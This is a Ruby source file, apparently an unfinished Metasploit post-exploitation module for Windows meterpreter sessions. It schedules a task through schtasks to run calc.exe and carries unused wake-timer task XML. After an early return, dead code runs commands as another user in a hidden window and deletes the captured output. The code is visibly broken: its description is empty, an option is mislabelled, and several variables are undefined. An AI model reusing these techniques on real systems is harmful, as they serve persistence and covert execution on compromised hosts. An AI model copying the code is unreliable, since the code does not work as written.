##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/file'
require 'msf/core/post/windows/priv'

class Metasploit3 < Msf::Post
	include Msf::Post::Windows::Priv

	def initialize(info={})
		super(update_info(info,
			'Name'                 => "Windows Manage Awaken Computer After Shutdown",
			'Description'          => %q{
			},
			'License'              => MSF_LICENSE,
			'Platform'             => ['win'],
			'SessionTypes'         => ['meterpreter'],
			'Author'               => ['Ben Campbell <eat_meatballs[at]hotmail.co.uk>']
		))

		register_options(
			[
				OptString.new('TIME', [true, 'Username to reset/login with', "00:00" ]),
			], self.class)
	end

	def run
		xml = %q{
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo><Date>2013-07-26T20:33:37</Date><Author>IEUser</Author></RegistrationInfo>
  <Triggers>
    <TimeTrigger><StartBoundary>2013-07-26T20:34:00</StartBoundary><Enabled>true</Enabled>
    </TimeTrigger>
  </Triggers>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <Duration>PT10M</Duration>
      <WaitTimeout>PT1H</WaitTimeout>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>true</WakeToRun>
    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>calc.exe</Command>
    </Exec>
  </Actions>
  <Principals>
    <Principal id="Author">
      <UserId>IE8Win7\IEUser</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>LeastPrivilege</RunLevel>
    </Principal>
  </Principals>
</Task>
		}
		# Look at s4u_persistance
		#Vista and up
		Time.new
		hour = Time.now.hour
		min = Time.now.min+1
		time = "#{hour}:#{min}"	
		cmd_exec = "schtasks.exe" 
		cmd_args = "/create /tn parp /tr calc.exe /sc once /st #{time}"
		print_status("Scheduling task to run at #{time}")
		# reset user pass if setpass is true
		p = client.sys.process.execute(cmd_exec, cmd_args,
                        'Hidden'      => false)
		return
		if datastore["SETPASS"]
			print_status("Setting user password")
			if !reset_pass(user,pass)
				print_error("Error resetting password")
				return 0
			end
		end

		# set profile paths
		sysdrive = session.fs.file.expand_path("%SYSTEMDRIVE%")
		os = @host_info['OS']
		profiles_path = sysdrive + "\\Documents and Settings\\"
		profiles_path = sysdrive + "\\Users\\" if os =~ /(Windows 7|2008|Vista)/
		path = profiles_path + user + "\\"
		outpath =  path + "out.txt"

		# this is start info struct for a hidden process last two params are std out and in.
		#for hidden startinfo[12] = 1 = STARTF_USESHOWWINDOW and startinfo[13] = 0 = SW_HIDE
		startinfo = [0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0]
		startinfo = startinfo.pack("LLLLLLLLLLLLSSLLLL")

		#set command string based on cmdout vars
		cmdstr = "cmd.exe /c #{cmd}"
		cmdstr = "cmd.exe /c #{cmd} > #{outpath}" if cmdout
		# Check privs and execute the correct commands
		# if local admin use createprocesswithlogon, if system logonuser and createprocessasuser
		# execute command and get output with a poor mans pipe

		if priv_check
			if @isadmin #local admin
				print_status("Executing CreateProcessWithLogonW...we are Admin")
				cs = rg_adv.CreateProcessWithLogonW(user,nil,pass,"LOGON_WITH_PROFILE",nil, cmdstr,
					"CREATE_UNICODE_ENVIRONMENT",nil,path,startinfo,16)
			else #system with correct token privs enabled
				print_status("Executing CreateProcessAsUserA...we are SYSTEM")
				l = rg_adv.LogonUserA(user,nil,pass, "LOGON32_LOGON_INTERACTIVE",
					"LOGON32_PROVIDER_DEFAULT", 4)
				cs = rg_adv.CreateProcessAsUserA(l["phToken"], nil, cmdstr, nil, nil, false,
					"CREATE_NEW_CONSOLE", nil, nil, startinfo, 16)
			end
		else
			print_error("Insufficient Privileges, either you are not Admin or system or you elevated")
			print_error("privs to system and do not have sufficient privileges. If you elevated to")
			print_error("system, migrate to a process that was started as system (srvhost.exe)")
			return 0
		end

		# Only process file if the process creation was successful, delete when done, give us info
		# about process
		if cs["return"]
			tmpout = ""
			if cmdout
				outfile = session.fs.file.new(outpath, "rb")
				until outfile.eof?
					tmpout << outfile.read
				end
				outfile.close
				c = session.sys.process.execute("cmd.exe /c del #{outpath}", nil, {'Hidden' => true})
				c.close
			end

			pi = cs["lpProcessInformation"].unpack("LLLL")
			print_status("Command Run: #{cmdstr}")
			print_status("Process Handle: #{pi[0]}")
			print_status("Thread Handle: #{pi[1]}")
			print_status("Process Id: #{pi[2]}")
			print_status("Thread Id: #{pi[3]}")
			print_line(tmpout)
		else
			print_error("Oops something went wrong. Error Returned by Windows was #{cs["GetLastError"]}")
			return 0
		end
	end
end
